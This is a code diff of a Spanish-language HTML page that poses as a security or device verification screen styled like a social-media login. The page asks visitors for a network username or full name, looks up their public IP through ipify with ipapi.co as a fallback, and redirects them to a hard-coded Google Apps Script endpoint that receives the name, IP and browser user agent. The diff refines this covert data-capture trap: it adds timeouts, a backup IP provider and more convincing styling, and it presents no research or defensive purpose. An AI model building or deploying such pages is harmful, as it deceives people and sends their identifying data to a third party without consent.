@@ -3,49 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación de Seguridad</title>
+    <title>Validación de Dispositivo</title>
     <style>
-        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        input { width: 100%; padding: 10px; margin: 15px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 35px; width: 330px; text-align: center; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
+        input { width: 100%; padding: 12px; margin: 18px 0; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; box-sizing: border-box; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:disabled { background: #b2dffc; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <b>Autenticación de Acceso</b>
-    <p style="font-size: 13px; color: #8e8e8e;">Valide su identidad para continuar.</p>
-    <input type="text" id="idRed" placeholder="Usuario o ID de Red">
-    <button id="execBtn" onclick="ejecutarCaptura()">Verificar</button>
+    <div style="font-weight: 700; font-size: 20px; margin-bottom: 10px; color: #262626;">Verificación de Seguridad</div>
+    <p style="font-size: 14px; color: #8e8e8e;">Para acceder, valide su usuario de red o nombre completo.</p>
+    <input type="text" id="userInput" placeholder="Usuario o Nombre" autocomplete="off">
+    <button id="btn" onclick="iniciarAuditoria()">Validar y Continuar</button>
 </div>
 
 <script>
-    async function ejecutarCaptura() {
-        const user = document.getElementById('idRed').value;
-        if (!user) { alert("Ingrese su ID"); return; }
+    async function iniciarAuditoria() {
+        const user = document.getElementById('userInput').value;
+        const btn = document.getElementById('btn');
+        
+        if (!user) { alert("Campo obligatorio"); return; }
 
-        const btn = document.getElementById('execBtn');
-        btn.innerText = "Procesando...";
         btn.disabled = true;
+        btn.innerText = "Verificando red...";
 
+        let ipFinal = "No_Capturada";
+        
         try {
-            // FORZAR ESPERA DE IP (AWAIT)
-            const res = await fetch('https://api.ipify.org?format=json');
+            // Intento 1: Proveedor principal
+            const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
             const data = await res.json();
-            const ipReal = data.ip;
-            const hardware = navigator.userAgent;
-
-            // URL DE APPS SCRIPT (Endpoint verificado)
-            const endpoint = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
-            
-            // Construcción del salto con parámetros inyectados
-            window.location.href = `${endpoint}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ipReal)}&ua=${encodeURIComponent(hardware)}`;
-
+            ipFinal = data.ip;
         } catch (e) {
-            // Fallback en caso de error de red
-            window.location.href = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec?u=" + encodeURIComponent(user) + "&ip=Error_Captura&ua=" + encodeURIComponent(navigator.userAgent);
+            try {
+                // Intento 2: Proveedor de respaldo si el primero falla o tarda mucho
+                const res2 = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+                const data2 = await res2.json();
+                ipFinal = data2.ip;
+            } catch (e2) {
+                ipFinal = "Error_Timeout";
+            }
         }
+
+        // Endpoint de Google Apps Script actualizado
+        const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
+        const hardware = navigator.userAgent;
+
+        // EJECUCIÓN DEL SALTO: Solo ocurre después de intentar obtener la IP
+        window.location.href = `${scriptURL}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ipFinal)}&ua=${encodeURIComponent(hardware)}`;
     }
 </script>
 </body>
